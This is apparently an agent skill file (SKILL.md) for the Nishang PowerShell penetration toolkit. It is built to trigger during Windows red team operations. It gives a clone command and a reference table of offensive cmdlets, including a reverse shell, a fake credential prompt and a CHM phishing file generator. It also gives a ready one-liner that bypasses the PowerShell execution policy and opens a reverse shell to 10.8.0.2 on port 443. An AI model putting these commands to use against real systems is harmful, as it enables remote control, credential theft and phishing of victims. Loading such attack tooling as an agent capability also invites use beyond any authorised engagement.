---
name: nishang-powershell
description: "Nishang: PowerShell penetration toolkit. Signals: red team, methodology, load framework, reverse shell, port scan."
zh-signals: "Nishang: PowerShell 渗透脚本全家桶。信号:红队,方法论,加载框架,反弹,端口扫。"
when-to-use: >-
  Use during Windows red team operations when you need ready-made offensive
  PowerShell scripts for reverse shells, port scanning, host information, or
  phishing artifacts.
---

# Nishang

- Attack Category: C50 Red Team Methodology and Automation
- Upstream Repository: https://github.com/samratashok/nishang
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/samratashok/nishang
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `Import-Module ./Nishang.ps1` | Load the framework |
| `Invoke-PowerShellTcp -Reverse -IPAddress x -Port 443` | Reverse shell |
| `Invoke-PortScan` | Port scan |
| `Get-Information` | System information |
| `Invoke-CredentialsPhish` | Pop up a credential prompt |
| `Out-CHM` | Generate a CHM phishing file |
| `HTTP-Listener` | HTTP service |

## Attack Scenario Playbook

### PowerShell Penetration Script Toolkit

```bash
powershell -ep bypass -c 'Import-Module ./nishang/Nishang.ps1; Invoke-PowerShellTcp -Reverse -IPAddress 10.8.0.2 -Port 443'
```

## Notes

A classic collection of offensive PowerShell scripts; scripts can be copied and used standalone, complementing Empire/WinPwn.
